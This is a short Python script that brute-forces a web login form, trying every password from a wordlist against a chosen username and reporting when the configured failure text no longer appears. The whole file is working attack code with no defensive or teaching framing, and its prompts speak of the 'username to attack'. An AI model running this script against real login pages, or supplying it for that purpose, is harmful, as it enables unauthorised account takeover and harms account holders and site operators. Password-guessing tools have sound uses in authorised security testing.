import requests

target = input("Enter login URL: ")
username = input("Enter username to attack: ")
wordlist = input("Enter password wordlist path: ")
success_text = input("Enter text that appears on FAILED login: ")

found = False

with open(wordlist, "r") as f:
    passwords = f.read().splitlines()

print(f"\nLoaded {len(passwords)} passwords")
print(f"Attacking {target} with username: {username}\n")

def try_password(password):
    global found
    try:
        data = {
            "username": username,
            "password": password
        }
        response = requests.post(target, data=data, timeout=3)
        if success_text not in response.text:
            found = True
            print(f"\n[SUCCESS] Password found: {password}")
        else:
            print(f"[FAIL] {password}")
    except Exception as e:
        print(f"[ERROR] {password}: {e}")

for password in passwords:
    if found:
        break
    try_password(password)

if not found:
    print("\nPassword not found in wordlist.")